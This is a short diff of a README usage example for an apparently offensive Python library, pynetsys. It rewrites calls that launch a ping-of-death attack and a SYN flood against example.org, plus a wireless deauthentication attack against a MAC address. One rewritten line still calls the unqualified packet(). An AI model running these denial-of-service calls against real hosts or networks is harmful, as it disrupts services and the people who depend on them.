@@ -34,13 +34,13 @@ print(hostinfo)
 ```python
 import pynetsys
 
-PACKET, ID = packet(target = "example.org", attack = Packets.DEATH_PING)
-start(PACKET, ID, _verbose = 0)
+PACKET, ID = pynetsys.packet.packet(target = "example.org", attack = pynetsys.packet.Packets.DEATH_PING)
+pynetsys.packet.start(PACKET, ID, _verbose = 0)
 
-PACKET, ID = packet(target = "example.org", attack = Packets.SYN_FLOOD)
-start(PACKET, ID, _verbose = 0)
+PACKET, ID = packet(target = "example.org", attack = pynetsys.packet.Packets.SYN_FLOOD)
+pynetsys.packet.start(PACKET, ID, _verbose = 0)
 
-PACKET, ID = packet(target = "aa:bb:cc:dd:ee:ff", attack = Packets.WIRELESS_DEAUTH)
-start(PACKET, ID, _verbose = 0)
+PACKET, ID = pynetsys.packet.packet(target = "aa:bb:cc:dd:ee:ff", attack = pynetsys.packet.Packets.WIRELESS_DEAUTH)
+pynetsys.packet.start(PACKET, ID, _verbose = 0)
 
 ```
